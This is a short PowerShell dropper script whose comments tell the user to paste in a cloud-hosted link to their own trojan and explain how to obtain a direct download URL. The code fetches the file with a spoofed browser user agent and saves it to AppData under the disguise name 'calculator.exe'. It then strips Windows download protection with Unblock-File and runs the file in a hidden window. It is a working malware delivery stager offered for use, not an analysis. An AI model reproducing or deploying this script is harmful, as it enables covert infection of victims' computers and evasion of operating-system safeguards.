# Define the URL of the file to download
# Define the URL of the file to download
# Use a direct dowload link if your link to the cloud hosted executable is not working, In the Developer Tools window, click on the Network tab.
# Make sure the Preserve log option is checked (this ensures the log isn't cleared when the page reloads).
# Click the Download button again to start the download.
# In the Network tab, look for a request that starts with download?. Copy this entire URL (It is long) and place it as the $WebFile contents.
$WebFile = " " # Add a link to your trojan here in Dropbox or OneDrive or any cloud hosting service you like.

# Define the destination path for the downloaded file
$destination = "$env:APPDATA\calculator.exe"

# Download the file using Invoke-WebRequest
try {
    Write-Host "Downloading file from $WebFile..."
    Invoke-WebRequest -Uri $WebFile -OutFile $destination -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    Write-Host "File downloaded successfully to $destination."
} catch {
    Write-Host "Failed to download file: $_"
    exit
}

# Check if the file exists and unblock it
if (Test-Path $destination) {
    try {
        Write-Host "Unblocking file $destination..."
        Unblock-File -Path $destination
        Write-Host "File unblocked successfully."
    } catch {
        Write-Host "Failed to unblock file: $_"
        exit
    }
} else {
    Write-Host "File download failed. The file does not exist at $destination."
    exit
}

# Execute the file
try {
    Write-Host "Executing file $destination..."
    Start-Process -FilePath $destination -WindowStyle hidden
    Write-Host "File executed successfully."
} catch {
    Write-Host "Failed to execute file: $_"
}
